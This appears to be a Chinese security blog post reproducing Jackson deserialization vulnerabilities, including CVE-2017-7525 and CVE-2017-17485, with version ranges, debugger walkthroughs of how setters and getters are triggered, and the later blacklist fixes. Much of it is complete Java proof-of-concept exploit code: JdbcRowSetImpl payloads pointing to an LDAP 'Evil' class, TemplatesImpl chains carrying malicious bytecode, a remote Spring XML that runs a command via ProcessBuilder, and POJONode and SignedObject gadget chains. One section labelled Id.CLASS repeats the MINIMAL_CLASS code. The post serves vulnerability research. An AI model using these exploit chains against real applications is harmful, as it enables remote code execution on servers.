---
title: "jackson 反序列化合集"
onlyTitle: true
date: 2024-10-15 15:37:23
categories:
- java
- 框架漏洞
tags:
- jackson
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8108.jpg
---



想不到2017的链子我还在复现

### 反序列化条件

达到以下任意一个条件，可以反序列化指定类：

* 开启了enableDefaultTyping()四个的任意一个设置，不过不同设置能反序列化的范围不同，trick也不同（不过范围最小的JAVA_LANG_OBJECT都够用）
* 使用了@JsonTypeInfo注解字段，注解值为`JsonTypeInfo.Id.CLASS`或者`JsonTypeInfo. Id. MINIMAL_CLASS`

### 反序列化json格式

当然，你也能观察到不同的指定方式，json的格式不同。比如enableDefaultTyping()设置后序列化出来的字符串，并没有`@`符号，而是用`[]`包裹了

* enableDefaultTyping对应json格式： 

```json
// 设置JAVA_LANG_OBJECT  
{"age":6,"name":"mi1k7ea","object":["com.mi1k7ea.Hacker",{"skill":"Jackson"}]} 
```

`[]`夹住的第一个字符串是类名，后面如果直接加字符串，是调用构造构造函数（不加是调无参构造函数），加`{}`是调用setter赋值

* `@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)`

```json
{"age":6,"name":"drunkbaby","object":{"@class":"com.drunkbaby.Hacker","skill":"hiphop"}}
```

* `@JsonTypeInfo(use = JsonTypeInfo. Id. MINIMAL_CLASS)`

```json
{"age":6,"name":"drunkbaby","object":{"@c":"com.drunkbaby.Hacker","skill":"hiphop"}}
```

### 反序列化入口

反序列化的入口为以下两个的一种：

* JsonFactory.createParser
* objectMapper.readValue

jackson漏洞版本可以触发任意函数的构造函数和setter，以此衍生出攻击面

JdbcRowSetImpl肯定能用

## JdbcRowSetImpl

### Id_Class版

```java
public class JdbcRowSetImpl {
    public static class Id_Class_Test {
        @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
        public Object object;
    }
    public static void main(String[] args) throws IOException {
        String jsonInput = aposToQuotes("{\"object\":{'@class':'com.sun.rowset.JdbcRowSetImpl',\n" +
                "'dataSourceName':'ldap://192.168.80.1:8085/Evil',\n" +
                "'autoCommit':0,\n" +
                "}\n" +
                "}");
        System.out.printf(jsonInput);
        ObjectMapper mapper = new ObjectMapper();
        try {
            JdbcRowSetImpl.Id_Class_Test test = mapper.readValue(jsonInput, JdbcRowSetImpl.Id_Class_Test.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }
}
```



### enableDefaultTyping版

```java
public class JdbcRowSetImpl {
    public static class enableDefaultTyping_Test {
        public Object object;
    }
    public static void main(String[] args) throws IOException {
        String jsonInput = aposToQuotes("{\"object\":['com.sun.rowset.JdbcRowSetImpl',\n" +
                "{\n" +
                "'dataSourceName':'ldap://192.168.80.1:8085/Evil',\n" +
                "'autoCommit':0,\n" +
                "}\n" +
                "]\n" +
                "}");
        System.out.printf(jsonInput);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            JdbcRowSetImpl.enableDefaultTyping_Test test = mapper.readValue(jsonInput, JdbcRowSetImpl.enableDefaultTyping_Test.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }
}
```

## CVE-2017-7525 TemplatesImpl链

和fastjson不同的是，fastjson是直接指定传入的类，而jackson，是指定Object字段为恶意类

### 影响版本

Jackson 2.6系列 < 2.6.7.1

Jackson 2.7系列 < 2.7.9.1

Jackson 2.8系列 < 2.8.8.1

jdk<=7u21||8u20

pom.xml：

```xml
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.7.3</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-core</artifactId>
            <version>2.7.3</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-annotations</artifactId>
            <version>2.7.3</version>
```

### enableDefaultTyping POC

在调试分析jackson反序列化过程时，提到反序列化时，会根据字符串自动调用构造函数和setter赋值。https://godownio.github.io/2024/10/11/jackson-fan-xu-lie-hua-liu-cheng-fen-xi-wu-poc

那什么时候会调用getter呢？我们用下面的POC做下实验

Test类：

```java
public class Test {
    public Object object;
}
```

POC：

```java
public class jackson_TemplatesImpl {
    public static void main(String[] args) throws IOException {
        String exp = readClassStr("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class");
        String jsonInput = aposToQuotes("{\"object\":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "{\n" +
                "'transletBytecodes':['"+exp+"'],\n" +
                "'transletName':'test',\n" +
                "'outputProperties':{}\n" +
                "}\n" +
                "]\n" +
                "}");
        System.out.printf(jsonInput);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Test test;
        try {
            test = mapper.readValue(jsonInput, Test.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static String readClassStr(String cls) throws IOException {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code1);
    }
}
```

我们略过一些令牌提取的步骤，从上面的poc可以知道，object字段对应了一个`[...]`的数组，所以在vanillaDeserialize中会有一个嵌套的解析。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418163719798.png)

isExpectedStartArrayToken判断了一下是不是数组开头，然后`_findDeserializer`获取了数组下子属性的反序列化器，然后调用其deserialize

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418164124285.png)

然后在还原子属性的时候，outputProperties取到的Property是SetterlessProperty

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418164300399.png)

跟进到SetterlessProperty.deserializeAndSet，发现判断了一下其对应value是不是个对象，否则调用getter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418164412071.png)

那什么情况会调用getter呢？换句话说，什么情况会调用到SetterlessProperty呢？

详细的解析过程略过，初始化SetterlessProperty的栈如下，重点关注BeanDeserializerFactory.addBeanProps

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418170117903.png)

看到这个至关重要的循环，具体逻辑如下：

* 如果属性有Setter方法，则通过constructSettableProperty方法创建SettableBeanProperty。
* 如果没有Setter但有字段，则同样通过constructSettableProperty方法创建SettableBeanProperty。
* 如果启用了useGettersAsSetters且属性有Getter方法，并且getter返回值是Collection或Map，则通过constructSetterlessProperty方法创建SettableBeanProperty。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418170359326.png)

useGettersAsSetters默认为true

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418170549640.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418170525469.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418170541534.png)

我们所传入的outputProperties，TemplatesImpl内是没有这个字段的，而且也没有对应的setter。而且该方法返回的Properties也是Map的子类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418170830371.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418170856881.png)

所以理论上来说，jackson调用getter也是有相当大的局限的

还记得上面提到的准备反序列化数组时`AsArrayTypeDeserializer._findDeserializer`获取子属性的反序列化器吗

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418164732437.png)

一直跟进到BeanDeserializerBase，循环为数组每个prop装配Deserializer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250418165313954.png)



其他的就是调setter赋值了，注意jackson能调用私有的setter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013111602440.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013111700984.png)

有没有注意到我们并没有设置一般都会设置的`_tfactory`

在CC中我们不设置，是因为readObject帮我们设置了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013113237325.png)

在JDK低版本用不到`_tfactory`，所以不设置也没问题

在JDK>7U21||>8u20的情况下，不设置`_tfactory`defineTransletClasses会报错

区别如下：

左为JDK8U65，右为JDK7U21

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013114035230.png)

### JsonTypeInfo.Id.CLASS POC

```JAVA
package org.exploit.third.jackson;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.unboundid.util.Base64;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Id_MINIMAL_Class_TemplatesImpl {
    public static class Id_Class_Test {
        @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)
        public Object object;
    }
    public static void main(String[] args) throws IOException {
        String exp = readClassStr("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class");
        String jsonInput = aposToQuotes("{\"object\":{'@c':'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "'transletBytecodes':['"+exp+"'],\n" +
                "'transletName':'test',\n" +
                "'outputProperties':{}\n" +
                "}\n" +
                "}");
        System.out.printf(jsonInput);
        ObjectMapper mapper = new ObjectMapper();
        try {
            Id_Class_Test test = mapper.readValue(jsonInput, Id_Class_Test.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static String readClassStr(String cls) throws IOException {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code1);
    }
}
```



### JsonTypeInfo.Id.MIMIMAL_CLASS POC

```java
package org.exploit.third.jackson;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.unboundid.util.Base64;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Id_MINIMAL_Class_TemplatesImpl {
    public static class Id_Class_Test {
        @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)
        public Object object;
    }
    public static void main(String[] args) throws IOException {
        String exp = readClassStr("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class");
        String jsonInput = aposToQuotes("{\"object\":{'@c':'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "'transletBytecodes':['"+exp+"'],\n" +
                "'transletName':'test',\n" +
                "'outputProperties':{}\n" +
                "}\n" +
                "}");
        System.out.printf(jsonInput);
        ObjectMapper mapper = new ObjectMapper();
        try {
            Id_Class_Test test = mapper.readValue(jsonInput, Id_Class_Test.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static String readClassStr(String cls) throws IOException {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code1);
    }
}
```

fastjson跑不了这个链，因为fastjson对于getOutputProperties这种getter是不会调用的，返回值不满足要求



### 修复

pom.xml修改jackson-databind版本至2.7.9.1

```
	<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.7.9.1</version>
```

再次运行报`Illegal type to deserialize: prevented for security reasons`错误

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013133638872.png)

加了checkIllegalTypes黑名单验证

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013133921885.png)

包括以下类，TemplatesImpl被过滤

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013134035475.png)

## CVE-2017-17485 ClassPathXmlApplicationContext链

Jackson 2.7系列 < 2.7.9.2

Jackson 2.8系列 < 2.8.11

Jackson 2.9系列 < 2.9.4

jdk无版本限制

此漏洞为jackson打spring，需要点上spring的依赖：

```xml
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>5.3.28</version>
    </dependency>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-expression</artifactId>
        <version>5.3.28</version>
    </dependency>
    <dependency>
        <groupId>commons-logging</groupId>
        <artifactId>commons-logging</artifactId>
        <version>1.2</version>
    </dependency>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-beans</artifactId>
        <version>5.3.28</version>
    </dependency>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-context</artifactId>
        <version>5.3.28</version>
    </dependency>
```

spEL表达式注入：

https://godownio.github.io/2024/10/14/spel-biao-da-shi-zhu-ru/

默认singleton模式下，ClassPathXmlApplicationContext加载xml资源，并完成实例化和调用setter传参。这个xml资源可以是http路径。（无需getBean就能触发整个创建Bean的流程

```java
    public static void main(String[] args) {
        ApplicationContext applicationContext=new ClassPathXmlApplicationContext("http://127.0.0.1:8888/spel.xml");
    }
```

spel.xml内的bean需要先创建实例，再执行spEL表达式，所以得找一个能new，然后执行命令的方式，Runtime new不了

ProcesserBuilder就很合适：

```java
ProcessBuilder pb = new ProcessBuilder("command","param...");
Process pro2 = pb.start();
```

弹计算器：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg name="command" value="calc"/>
        <property name="whatever" value="#{pb.start()}"/>
    </bean>
</beans>
```

jackson能调用有参构造函数，enableDefaultTyping POC：

```java
public class PoC {  
    public static void main(String[] args)  {  
        //CVE-2017-17485  
        String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1:8888/spel.xml\"]";  
        ObjectMapper mapper = new ObjectMapper();  
        mapper.enableDefaultTyping();  
        try {  
            mapper.readValue(payload, Object.class);  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
    }  
}
```

### 修复

https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf

换成 jackson-databind-2.7.9.2版本的 jar 试试，会报错，显示由于安全原因禁止了该非法类的反序列化操作：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014121854126.png)

黑名单位于：

```
com.fasterxml.jackson.databind.jsontype.impl.SubTypeValidator
```

并没有看到黑名单类里面有我们利用的这个类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014121955829.png)

再往下看，这里会把所有 `org.springframe` 开头的类名做处理

![](https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/fullStartsBan.png)

先进行黑名单过滤，发现类名不在黑名单后再判断是否是以 `org.springframe` 开头的类名，是的话循环遍历目标类的父类是否为 `AbstractPointcutAdviso` 或 `AbstractApplicationContext`，是的话跳出循环然后抛出异常：

而我们的利用类其继承关系是这样的：

```java
…->AbstractApplicationContext->
    AbstractRefreshableApplicationContext->
    AbstractRefreshableConfigApplicationContext->
    AbstractXmlApplicationContext->
    ClassPathXmlApplicationContext
```

可以看到，ClassPathXmlApplicationContext 类是继承自 AbstractApplicationContext 类的，而该类会被过滤掉，从而没办法成功绕过利用。

## 打依赖包通杀

此处通杀指打依赖包，不是readValue作为入口

jackson-databind>=2.13.3

jackson-databind core annotations三包版本需匹配

```xml
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.13.3</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-core</artifactId>
            <version>2.13.3</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-annotations</artifactId>
            <version>2.13.3</version>
        </dependency>
```

### POJONode链

入口点位于com.fasterxml.jackson.databind.node下POJONode.toString

实际上调用的是父类BaseJsonNode.toString

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153045970.png)

nodeToString调用到writeValueAsString，会触发getter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153105858.png)

但是在序列化过程中，ObjectOutputStream.writeObject0会判断类是否重写了writeReplace方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153445716.png)



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153454999.png)

BaseJsonNode重写了writeReplace方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014153549511.png)

在调用这个方法时发生了异常，把这个方法删了可以顺利序列化

序列化当然不会影响反序列化的进程，直接重写

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014155725144.png)

利用链：

```java
BadAttributeValueExpException.readObject ->
    POJONode.toString ->
    	InternalNodeMapper,nodeToString ->
    	JSONMapper.writeValueAsString -> getter
```

POC:

```java
public class POJONode_TemplatesImpl {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        POJONode pojoNode = new POJONode(templatesClass);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, pojoNode);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

### SignedObject链

打二次反序列化，用于绕过自定义了POJONode对入口类的筛查，循环嵌套过滤的不能绕过

SignedObject.getObject能反序列化this.content：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214004303.png)

content能在构造函数赋值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014214038344.png)

SignedObject装配恶意类，然后找能触发getter的地方

利用链：

```java
BadAttributeValueExpException.readObject ->
    POJONode.toString ->
    	InternalNodeMapper,nodeToString ->
    	JSONMapper.writeValueAsString -> 
    		SignedObject.getObject ->
    BadAttributeValueExpException.readObject ->
    POJONode.toString ->
    	InternalNodeMapper,nodeToString ->
    	JSONMapper.writeValueAsString -> 
    		TemplatesImpl.getOutputProperties
```



参考链接：

https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr%3DiQGkDRQDcWLmxY5q4Qox#toc-26



